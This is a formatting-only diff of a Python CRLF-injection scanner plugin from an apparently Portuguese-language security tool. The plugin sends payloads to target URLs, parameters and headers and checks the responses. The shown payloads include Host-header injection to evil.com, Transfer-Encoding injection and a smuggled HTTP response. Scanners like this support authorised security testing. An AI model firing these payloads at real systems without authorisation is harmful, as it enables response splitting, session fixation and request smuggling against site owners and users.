@@ -1,12 +1,29 @@
 # plugins/crlf_scanner.py — Cascavel 2026 Intelligence
-import requests
-import urllib.parse
 
+import requests
 
 PARAMS = [
-    "url", "redirect", "next", "return", "path", "page", "lang", "ref",
-    "goto", "dest", "continue", "forward", "location", "uri", "callback",
-    "out", "target", "view", "site", "domain", "host",
+    "url",
+    "redirect",
+    "next",
+    "return",
+    "path",
+    "page",
+    "lang",
+    "ref",
+    "goto",
+    "dest",
+    "continue",
+    "forward",
+    "location",
+    "uri",
+    "callback",
+    "out",
+    "target",
+    "view",
+    "site",
+    "domain",
+    "host",
 ]
 
 # ──────────── CRLF PAYLOADS ────────────
@@ -29,13 +46,21 @@ PAYLOADS = [
     ("%0d%0aHost:evil.com", "HOST_INJECTION"),
     ("%c0%0d%c0%0aInjected:OverlongCRLF", "OVERLONG_UTF8"),
     ("%0d%0aTransfer-Encoding:chunked", "TE_INJECTION"),
-    ("%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>SMUGGLED</html>", "HTTP_SMUGGLE_VIA_CRLF"),
+    (
+        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>SMUGGLED</html>",
+        "HTTP_SMUGGLE_VIA_CRLF",
+    ),
 ]
 
 CRITICO_METHODS = {
-    "SESSION_FIXATION", "XSS_PROTECTION_DISABLE", "CORS_INJECTION",
-    "CSP_OVERRIDE", "HOST_INJECTION", "TE_INJECTION",
-    "HTTP_SMUGGLE_VIA_CRLF", "LOCATION_INJECTION",
+    "SESSION_FIXATION",
+    "XSS_PROTECTION_DISABLE",
+    "CORS_INJECTION",
+    "CSP_OVERRIDE",
+    "HOST_INJECTION",
+    "TE_INJECTION",
+    "HTTP_SMUGGLE_VIA_CRLF",
+    "LOCATION_INJECTION",
 }
 
 
@@ -59,8 +84,7 @@ def _test_crlf_header(target, payload, method):
     vulns = []
     for header_name, header_val in headers_to_test:
         try:
-            resp = requests.get(f"http://{target}/",
-                                 headers={header_name: header_val}, timeout=6)
+            resp = requests.get(f"http://{target}/", headers={header_name: header_val}, timeout=6)
             found = _analyze_response(resp, f"header:{header_name}", method)
             vulns.extend(found)
             if found:
@@ -89,46 +113,57 @@ def _analyze_response(resp, injection_point, method):
         v_low = h_val.lower()
         if "injected" in h_low or "cascaveltest" in v_low or "unicodecrlf" in v_low:
             sev = "CRITICO" if method in CRITICO_METHODS else "ALTO"
-            vulns.append({
-                "tipo": "CRLF_INJECTION", "metodo": method,
-                "injection_point": injection_point,
-                "header_injetado": f"{h_name}: {h_val}",
-                "severidade": sev,
-                "descricao": f"CRLF injection via {method}!",
-            })
+            vulns.append(
+                {
+                    "tipo": "CRLF_INJECTION",
+                    "metodo": method,
+                    "injection_point": injection_point,
+                    "header_injetado": f"{h_name}: {h_val}",
+                    "severidade": sev,
+                    "descricao": f"CRLF injection via {method}!",
+                }
+            )
             break
 
     # Check body injection (response splitting)
     body_indicators = ["CRLFTest", "POISONED", "<h1>CRLF</h1>", "SMUGGLED"]
     for indicator in body_indicators:
         if indicator in resp.text:
-            vulns.append({
-                "tipo": "HTTP_RESPONSE_SPLITTING", "metodo": method,
-                "injection_point": injection_point,
-                "severidade": "CRITICO",
-                "descricao": f"Full HTTP response splitting — body injetado ({indicator})!",
-            })
+            vulns.append(
+                {
+                    "tipo": "HTTP_RESPONSE_SPLITTING",
+                    "metodo": method,
+                    "injection_point": injection_point,
+                    "severidade": "CRITICO",
+                    "descricao": f"Full HTTP response splitting — body injetado ({indicator})!",
+                }
+            )
             break
 
     # Check cookie injection
     for cookie_header in resp.headers.get("Set-Cookie", "").split(","):
         if "session=pwned" in cookie_header.lower():
-            vulns.append({
-                "tipo": "CRLF_COOKIE_INJECTION", "metodo": method,
-                "injection_point": injection_point,
-                "severidade": "CRITICO",
-                "descricao": "Session fixation via CRLF cookie injection!",
-            })
+            vulns.append(
+                {
+                    "tipo": "CRLF_COOKIE_INJECTION",
+                    "metodo": method,
+                    "injection_point": injection_point,
+                    "severidade": "CRITICO",
+                    "descricao": "Session fixation via CRLF cookie injection!",
+                }
+            )
 
     # Check CORS injection
     acao = resp.headers.get("Access-Control-Allow-Origin", "")
     if acao == "*" and "CORS_INJECTION" in method:
-        vulns.append({
-            "tipo": "CRLF_CORS_INJECTION",
-            "injection_point": injection_point,
-            "severidade": "CRITICO",
-            "descricao": "CORS wildcard injetado via CRLF!",
-        })
+        vulns.append(
+            {
+                "tipo": "CRLF_CORS_INJECTION",
+                "injection_point": injection_point,
+                "severidade": "CRITICO",
+                "descricao": "CORS wildcard injetado via CRLF!",
+            }
+        )
 
     return vulns
 
@@ -166,8 +201,16 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "crlf_scanner",
         "versao": "2026.1",
-        "tecnicas": ["get_param", "header_injection", "path_injection",
-                      "response_splitting", "cookie_injection", "cors_injection",
-                      "csp_override", "http_smuggle_chain", "unicode_bypass"],
+        "tecnicas": [
+            "get_param",
+            "header_injection",
+            "path_injection",
+            "response_splitting",
+            "cookie_injection",
+            "cors_injection",
+            "csp_override",
+            "http_smuggle_chain",
+            "unicode_bypass",
+        ],
         "resultados": vulns if vulns else "Nenhuma vulnerabilidade CRLF detectada",
     }
